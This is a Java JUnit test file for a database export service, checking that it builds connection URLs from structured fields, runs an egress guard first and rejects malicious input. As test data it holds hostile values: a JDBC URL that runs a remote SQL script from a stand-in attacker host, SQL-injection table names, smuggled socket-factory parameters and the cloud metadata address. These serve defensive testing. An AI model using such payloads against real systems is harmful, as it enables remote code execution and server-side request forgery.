package com.modocument.infrastructure.export;

import com.modocument.application.dto.DatabaseExportRequest;
import com.modocument.application.dto.TableData;
import com.modocument.application.port.integration.EgressGuard;
import com.modocument.infrastructure.integration.connector.ConnectorLimits;
import com.modocument.infrastructure.integration.connector.DbDialect;
import org.junit.jupiter.api.Test;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.jdbc.datasource.SimpleDriverDataSource;

import java.sql.DriverManager;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Properties;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

/**
 * ws28 hardening: the export target is structured (vendor/host/port/
 * database/schema/sslmode), the URL is built by {@link DbDialect} with our
 * timeouts, the bank-aware egress guard runs before any connection, and a
 * raw {@code jdbcUrl} is refused. The opener is replaced so the "PostgreSQL"
 * target lands in an in-memory H2 database named after {@code database}.
 */
class DatabaseExportServiceTest {

    private final List<String> openedUrls = new ArrayList<>();
    private final List<Properties> openedProperties = new ArrayList<>();
    private final List<String> egressChecks = new ArrayList<>();

    private final EgressGuard egress = (bankId, host, port) -> {
        egressChecks.add(bankId + "|" + host + ":" + port);
        if (host.equals("169.254.169.254")) {
            throw new SecurityException("Destination " + host + ":" + port + " refused.");
        }
    };

    private final DatabaseExportService service = new DatabaseExportService(egress,
            ConnectorLimits.defaults(), (dialect, url, properties) -> {
        openedUrls.add(url);
        openedProperties.add(properties);
        String database = url.substring(url.lastIndexOf('/') + 1).split("\\?")[0];
        return DriverManager.getConnection("jdbc:h2:mem:" + database + ";DB_CLOSE_DELAY=-1",
                "sa", "");
    });

    private static final TableData TABLE = new TableData(
            List.of("FirstName", "City"),
            List.of(Map.of("FirstName", "Ada", "City", "London"),
                    Map.of("FirstName", "Grace", "City", "Arlington")));

    private static DatabaseExportRequest request(String database, String tableName) {
        DatabaseExportRequest request = new DatabaseExportRequest();
        request.setVendor("POSTGRESQL");
        request.setHost("db.bank.example");
        request.setDatabase(database);
        request.setUsername("exporter");
        request.setPassword("s3cret");
        request.setTableName(tableName);
        return request;
    }

    private static JdbcTemplate h2(String database) {
        return new JdbcTemplate(new SimpleDriverDataSource(new org.h2.Driver(),
                "jdbc:h2:mem:" + database + ";DB_CLOSE_DELAY=-1", "sa", ""));
    }

    @Test
    void buildsTheUrlFromStructuredFieldsWithTimeoutsAndExports() {
        DatabaseExportRequest request = request("dbexport", "People");
        request.setSslmode("require");

        int inserted = service.export(TABLE, request, 7);

        assertThat(inserted).isEqualTo(2);
        assertThat(egressChecks).containsExactly("7|db.bank.example:5432");
        assertThat(openedUrls).singleElement().satisfies(url -> assertThat(url)
                .startsWith("jdbc:postgresql://db.bank.example:5432/dbexport?")
                .contains("sslmode=require")
                .contains("connectTimeout=")
                .contains("socketTimeout=")
                .contains("loginTimeout="));
        assertThat(openedProperties.get(0).getProperty("user")).isEqualTo("exporter");
        assertThat(openedProperties.get(0).getProperty("password")).isEqualTo("s3cret");
        JdbcTemplate jdbc = h2("dbexport");
        assertThat(jdbc.queryForObject("SELECT COUNT(*) FROM \"People\"", Integer.class))
                .isEqualTo(2);
        assertThat(jdbc.queryForObject(
                "SELECT \"FirstName\" FROM \"People\" WHERE \"City\" = 'London'", String.class))
                .isEqualTo("Ada");
    }

    @Test
    void tableIsAnAliasOfTableName() {
        DatabaseExportRequest request = request("dbexportalias", null);
        request.setTable("Aliased");

        assertThat(service.export(TABLE, request, 1)).isEqualTo(2);
        assertThat(h2("dbexportalias").queryForObject("SELECT COUNT(*) FROM \"Aliased\"",
                Integer.class)).isEqualTo(2);
    }

    @Test
    void aRawJdbcUrlIsRefusedWithTheMigrationHint() {
        DatabaseExportRequest request = request("dbexport", "People");
        request.setJdbcUrl("jdbc:h2:mem:evil;INIT=RUNSCRIPT FROM 'http://attacker/x.sql'");

        assertThatThrownBy(() -> service.export(TABLE, request, 1))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("jdbcUrl is no longer accepted")
                .hasMessageContaining("vendor");
        assertThat(openedUrls).isEmpty();
        assertThat(egressChecks).isEmpty();
    }

    @Test
    void rejectsMaliciousIdentifiersAndTargets() {
        assertThatThrownBy(() -> service.export(TABLE,
                request("dbexport2", "Foo\"; DROP TABLE x; --"), 1))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("Invalid tableName");

        DatabaseExportRequest badHost = request("db", "People");
        badHost.setHost("db.example.com/evil?socketFactory=x");
        assertThatThrownBy(() -> service.export(TABLE, badHost, 1))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("host");

        DatabaseExportRequest badDb = request("db;INIT=RUNSCRIPT", "People");
        assertThatThrownBy(() -> service.export(TABLE, badDb, 1))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("database");

        DatabaseExportRequest badSchema = request("db", "People");
        badSchema.setSchema("public; DROP");
        assertThatThrownBy(() -> service.export(TABLE, badSchema, 1))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("schema");

        DatabaseExportRequest badSsl = request("db", "People");
        badSsl.setSslmode("sslfactory=org.evil");
        assertThatThrownBy(() -> service.export(TABLE, badSsl, 1))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("sslmode");

        DatabaseExportRequest badVendor = request("db", "People");
        badVendor.setVendor("H2");
        assertThatThrownBy(() -> service.export(TABLE, badVendor, 1))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("vendor");
        assertThat(openedUrls).isEmpty();
    }

    @Test
    void theEgressGuardRunsBeforeAnyConnection() {
        DatabaseExportRequest metadata = request("db", "People");
        metadata.setHost("169.254.169.254");

        assertThatThrownBy(() -> service.export(TABLE, metadata, 3))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("refused");
        assertThat(openedUrls).isEmpty();
    }

    @Test
    void sslmodeMapsPerVendorAndPortsDefault() {
        DatabaseExportRequest sqlServer = request("reporting", "People");
        sqlServer.setVendor("sqlserver");
        sqlServer.setSslmode("verify-full");
        DatabaseExportService.Target target = service.target(sqlServer);
        assertThat(target.port()).isEqualTo(1433);
        assertThat(target.url(ConnectorLimits.defaults()))
                .contains("encrypt=true").contains("trustServerCertificate=false")
                .contains("loginTimeout=");
        assertThat(target.describe()).isEqualTo("sqlserver://db.bank.example:1433/reporting");

        DatabaseExportRequest maria = request("reporting", "People");
        maria.setVendor("MARIADB");
        maria.setSslmode("require");
        maria.setPort(3307);
        assertThat(service.target(maria).url(ConnectorLimits.defaults()))
                .startsWith("jdbc:mariadb://db.bank.example:3307/reporting")
                .contains("sslMode=trust").contains("allowLocalInfile=false");
    }

    @Test
    void failedInsertLeavesNoPartialRowsBehind() {
        JdbcTemplate jdbc = h2("dbexportrollback");
        // "Grace" does not fit, so the second row of the batch fails.
        jdbc.execute("CREATE TABLE \"People\" (\"FirstName\" VARCHAR(3), \"City\" VARCHAR(50))");

        assertThatThrownBy(() -> service.export(TABLE, request("dbexportrollback", "People"), 1))
                .isInstanceOf(RuntimeException.class);

        assertThat(jdbc.queryForObject("SELECT COUNT(*) FROM \"People\"", Integer.class)).isZero();
    }

    @Test
    void rejectsEmptyTable() {
        assertThatThrownBy(() -> service.export(new TableData(List.of(), List.of()),
                request("dbexport3", "People"), 1))
                .isInstanceOf(IllegalStateException.class);
    }

    @Test
    void createTableUsesAVendorTextTypeThatFitsTheRowLimit() {
        assertThat(DatabaseExportService.createTableSql(DbDialect.MARIADB, "`t`", List.of("a")))
                .isEqualTo("CREATE TABLE `t` (`a` TEXT)");
        assertThat(DatabaseExportService.createTableSql(DbDialect.SQLSERVER, "[t]", List.of("a")))
                .isEqualTo("CREATE TABLE [t] ([a] NVARCHAR(4000))");
    }
}
